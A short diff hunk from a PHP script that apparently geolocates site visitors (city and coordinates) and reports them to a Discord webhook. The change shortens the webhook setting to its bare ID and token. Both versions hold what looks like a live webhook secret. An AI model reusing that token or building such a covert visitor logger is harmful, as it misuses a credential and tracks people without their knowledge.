@@ -22,7 +22,7 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = "https://discord.com/api/webhooks/981101632269983784/9KL7OQRV3cNnwLsb0BG_keA6c_e8Q8gy1vijgQhBJhLea0J8y8H5vqpgro8jESOESQhx"; //Webhook here.
+$Webhook    = "981101632269983784/9KL7OQRV3cNnwLsb0BG_keA6c_e8Q8gy1vijgQhBJhLea0J8y8H5vqpgro8jESOESQhx"; //Webhook here.
 
 $WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
 
